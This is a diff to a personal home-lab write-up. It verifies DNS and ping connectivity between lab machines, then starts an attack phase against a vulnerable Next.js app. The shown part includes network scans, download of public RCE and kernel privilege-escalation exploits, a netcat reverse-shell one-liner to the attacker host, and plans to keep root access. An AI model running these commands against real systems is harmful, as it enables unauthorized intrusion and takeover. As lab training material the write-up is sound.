@@ -1,4 +1,4 @@
----
+<img width="1005" height="831" alt="image" src="https://github.com/user-attachments/assets/c90d5556-b050-49ea-85a3-088d43335372" />---
 title: " Home Lab 1 : Isolate "
 date: 2026-07-10 00:00:00 +0000
 categories: [Home Lab ]
@@ -3513,7 +3513,245 @@ If we even try to ping it from the Windows box using Hostname only , it will wor
 
 Let's move to the other boxes . 
 
+
 ##### Dirty2Geddon : 
+
+Let's test pinging each of the internal machines using their hostname : 
+
+To be able to resolve the Hostnames , we must modify the /etc/resolv.conf , to have the ORNN machine as our DNS resolver . 
+
+<img width="1119" height="688" alt="image" src="https://github.com/user-attachments/assets/a00e4540-c725-438d-9ace-92a168c780a2" />
+
+Now we can try pining them : 
+
+<img width="1046" height="839" alt="image" src="https://github.com/user-attachments/assets/a0acd9ce-e668-4a65-baf0-2fd70a553645" />
+
+The windows box shouldn't work , windows blocks icmp inbound by default but doesn't touch outbound , so let's try pinging it from the windows machine instead to see if it's actually reachable .
+
+<img width="1130" height="608" alt="image" src="https://github.com/user-attachments/assets/e8a76cda-856a-48da-ac36-091b4ae34f4b" />
+
+Worked Perfectly . 
+
+
+
+##### Backup : 
+
+
+Again let's test pinging each of the internal machines using their hostname : 
+
+To be able to resolve the Hostnames , we must modify the /etc/resolv.conf , to have the ORNN machine as our DNS resolver . 
+
+<img width="554" height="322" alt="image" src="https://github.com/user-attachments/assets/42faf8b4-e68e-4441-8c7e-b24a7820c702" />
+
+We try pinging : 
+
+<img width="887" height="730" alt="image" src="https://github.com/user-attachments/assets/4980c57d-adb1-4884-85b2-069f5bea2e9a" />
+
+Again , the windows and DC01 shouldn't work since windows blocks icmp inbound by default , but if we test it from the Rogue machine instead it should go through fine , since outbound icmp isn't blocked .
+
+<img width="1414" height="660" alt="image" src="https://github.com/user-attachments/assets/bdc60bc7-594a-433a-a1c5-5d56934ba812" />
+
+Worked Perfectly . 
+
+
+
+##### ORNN : 
+
+
+Since ORNN is our DNS server , hostname resolution here is obviously not an issue , it's resolving against itself .
+
+<img width="1005" height="831" alt="image" src="https://github.com/user-attachments/assets/1fe4d6e0-67b6-4722-829a-3819139de750" />
+
+Pinging the other Linux boxes works for the same reason as before , they don't block icmp by default . Windows and the DC still won't respond though , same story , icmp is blocked inbound on both .
+
+But we can test the ping from the windows machine instead . 
+
+<img width="1390" height="630" alt="image" src="https://github.com/user-attachments/assets/33174b17-a912-4621-bb3c-4ec65e4d4270" />
+
+No issues here as well . 
+
+
+
+##### Rogue : 
+
+Now from our Windows box , let's try pinging all the other machines : 
+
+<img width="1064" height="922" alt="image" src="https://github.com/user-attachments/assets/3c2d970f-7deb-4f59-920a-6678d68bb4e1" />
+
+Worked perfectly , for the DC , same as before ICMP will be blocked . 
+
+
+##### DC01 :
+
+
+Now from the DC let's check if we can resolve the other machines : 
+
+<img width="964" height="879" alt="image" src="https://github.com/user-attachments/assets/3a4ac08c-f89e-48f1-94ec-6251faffa747" />
+
+Again , Rogue shouldn't work since it's a Windows :)
+
+Now the Networking section is done . We can move on to the Attack phase . 
+
+
+
+
+### Attack Phase : 
+
+
+#### Fail2Copy (Initial Access) : 
+
+Now checking our Kali machine : 
+
+<img width="1172" height="640" alt="image" src="https://github.com/user-attachments/assets/975d9da1-73f2-44b1-8d16-985c3df99812" />
+
+This is our NAT interface . We will first start by scanning the entire netowrk to try and find live hosts , we can use nmap to scan for live hosts only without enumerating all open ports .
+
+```bash
+nmap -sn 192.168.32.0/24
+```
+
+<img width="1190" height="626" alt="image" src="https://github.com/user-attachments/assets/c062d3ad-880f-4380-9472-a56f4f1e333d" />
+
+To save us time , the IP address for the first box is the one highlighted : *192.168.32.147*
+
+```bash
+rustscan -a 192.168.32.147 --ulimit 5000 -b 1000  -- sVC
+```
+
+Since this is a Homelab , try lowering the batch number which is how many connections it tries to make at once, in this case i did 1000 , the default is 4500 , which is a lot of simultaneous connections, so it might miss some ports . 
+
+The -- is to pipe the output of the open ports to nmap for Version Scanning . 
+
+<img width="890" height="826" alt="image" src="https://github.com/user-attachments/assets/d62b4557-03e3-46a1-b2e5-8b34437d11fd" />
+
+We see port 3000 open , we can enumerate it further . 
+
+<img width="1212" height="697" alt="image" src="https://github.com/user-attachments/assets/acb84afb-8246-4c62-bbd8-03bc8e066f84" />
+
+We can see that it is a NetxJS app . But we don't get a version yet , tried checking with whatweb but didn't get anything as well . 
+
+```bash
+whatweb http://192.168.32.147:3000
+```
+
+<img width="1485" height="209" alt="image" src="https://github.com/user-attachments/assets/09357e4e-d470-4b2b-8741-a26efdcaa261" />
+
+Let's check the app , i already installed Wappalyzer Extension , which gives us information about the technologies used by the application . 
+
+<img width="1899" height="866" alt="image" src="https://github.com/user-attachments/assets/f77bcdeb-dc50-4d48-bef7-0163cd30eb82" />
+
+We get the version finally 15.0.4 . This one is vulnerable to an RCE , we can confirm by checking the Nextjs official website :
+
+```bash
+https://nextjs.org/blog/CVE-2025-66478
+```
+
+<img width="1301" height="753" alt="image" src="https://github.com/user-attachments/assets/78479857-2dbd-4abf-84d7-08e3bfbc7c59" />
+
+We can use any of these exploits , i will be using this one since it gives us an interactive Shell .  
+
+```bash
+https://github.com/Jenderal92/CVE-2025-55182-React2shell
+```
+
+We just download the exploit , make it executable , and run it : 
+
+```bash
+wget https://raw.githubusercontent.com/p3ta00/react2shell-poc/refs/heads/master/react2shell-poc.py
+chmod +x 
+```
+
+<img width="1182" height="799" alt="image" src="https://github.com/user-attachments/assets/9137fee4-1e21-4492-8ec0-7534a1b49207" />
+
+It takes as a parameter the URL and command we want to run . 
+
+The command we will run gives us back a reverse shell , we can use Revshell generator for this : 
+
+```bash
+https://www.revshells.com/
+```
+
+We can check if the machine has nc , since we can use it for our reverse shell .
+
+<img width="1056" height="795" alt="image" src="https://github.com/user-attachments/assets/5198aaab-6b7d-426d-9385-1b135c7f545e" />
+
+It is located at /usr/bin/nc .
+
+Now back to resvshell generator : 
+
+<img width="1141" height="724" alt="image" src="https://github.com/user-attachments/assets/83aa6d5a-ec14-4426-ad52-9affa0abf12d" />
+
+Now we set up our listner on Port 7777 .
+
+```bash
+nc -lnvp 7777
+python3 react2shell-poc.py -t 192.168.32.147:3000 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.32.134 7777 >/tmp/f'
+```
+
+<img width="1255" height="653" alt="image" src="https://github.com/user-attachments/assets/0527f63d-99ec-4c93-8bf5-e44375ab0551" />
+
+First let's start by stabilizing our shell :
+
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+background 
+stty raw -echo; fg
+export TERM=xterm
+PS1='\[\e[31m\]\u\[\e[96m\]@\[\e[35m\]\H\[\e[0m\]:\[\e[93m\]\w\[\e[0m\]\$'
+```
+
+<img width="1196" height="628" alt="image" src="https://github.com/user-attachments/assets/6aaa4840-232c-48bf-ad9b-6cb2c4e377a9" />
+
+Now our shell is stabilized , we can start our privesc . 
+
+What you can try is import tools like Chisel and look for misconfigurations , SUIDs , caps and permissions on files , but to save time , we will perform manual testing first and move to the kernel exploit . 
+
+```bash
+sudo -l : which prog can be ran with root perm . 
+uname -sr / lsb_relase -a : Version + architecture .  
+find / -type f -perm -04000 -ls 2>/dev/null : Find binaries with SUID .
+```
+
+<img width="860" height="278" alt="image" src="https://github.com/user-attachments/assets/f87cd152-4fc8-4d40-9987-c88de9a6092c" />
+
+We can check online for Vulnerabilities for this kernel version .  The most recent one will be the Dirty Frag or Copy fail vulnerability . 
+
+We'll test CopyFail first . 
+
+```bash
+https://xint.io/blog/copy-fail-linux-distributions#the-exploit-4
+```
+
+We just need to import the Exploit to the target host . we can use python for this , we setup python server , then use wget or curl to download the file onto the target . 
+
+<img width="1255" height="867" alt="image" src="https://github.com/user-attachments/assets/25010551-d4f1-4aee-9fab-4a1b17ff4cbc" />
+
+We already know Python is on the target host since we used it to stabilize our shell earlier . 
+
+You can use the official exploit , i will be using this exploit since i find it to be more stable : 
+
+```bash
+https://github.com/slaptat/copyFail30/blob/main/copyFail30.py
+```
+
+We just import it the same way : 
+
+```bash
+wget https://raw.githubusercontent.com/slaptat/copyFail30/refs/heads/main/copyFail30.py
+python3 -m http.server 80 
+wget http://192.168.32.134/exploit.py
+```
+<img width="1491" height="663" alt="image" src="https://github.com/user-attachments/assets/692f42ae-e383-42ad-a6e2-b796a4a9463f" />
+
+From there we just run it this should give us Root . 
+
+<img width="1043" height="511" alt="image" src="https://github.com/user-attachments/assets/8bdae6f1-ff2b-4e16-9207-5439ff698b07" />
+
+Now we will be using this Box to pivot to the Internal Network so we need to keep an easy way in . 
+
+We can do that by getting the Root Private key , enable root login if not enabled so that we can login as root more reliabely . 
+
+
 
 
 
